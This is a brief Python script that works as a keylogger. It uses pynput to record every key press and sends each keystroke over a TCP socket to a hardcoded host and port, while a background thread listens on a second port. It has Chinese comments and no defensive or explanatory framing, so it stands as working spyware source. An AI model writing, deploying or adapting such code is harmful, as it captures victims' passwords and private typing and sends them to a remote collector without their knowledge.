from pynput.keyboard import Key, Listener
import socket
import threading
import re

localHost = "10.64.83.186"
transferHost = "10.64.83.186"
receivePort = 5051
transferPort = 5053

receiveSocket = socket.socket()
receiveSocket.bind((localHost, receivePort))
receiveSocket.listen(5)
transferSocket = socket.socket()
transferSocket.connect((transferHost, transferPort))

def receive():
    c, addr = receiveSocket.accept()
    while True:
        transferHost = c.recv(20).decode()
        print(transferHost)

def on_press(key):
    key = str(key).encode()
    transferSocket.send(key)
    print(key)


def on_release(key):
    # 监听释放
    # print('{0} release'.format(key))
    # print(key)
    if key == Key.esc:
        # Stop listener
        return False


def transfer():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == '__main__':
    # 连接事件以及释放
    receiveThread = threading.Thread(target=receive)
    receiveThread.setDaemon(True)
    receiveThread.start()
    transfer()
    transferSocket.close()  
    
